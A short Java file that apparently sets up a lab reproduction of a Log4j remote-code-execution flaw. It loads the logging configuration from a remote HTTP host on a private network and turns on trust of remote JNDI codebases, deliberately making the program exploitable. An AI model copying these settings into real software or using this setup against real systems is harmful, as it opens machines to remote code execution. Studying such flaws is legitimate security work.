package net;
import java.util.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4J {
    static{
        System.setProperty("log4j2.configurationFile", "http://192.168.64.2:8000/log4jRCE2-44832/config.xml");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    }

    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {
    }
}
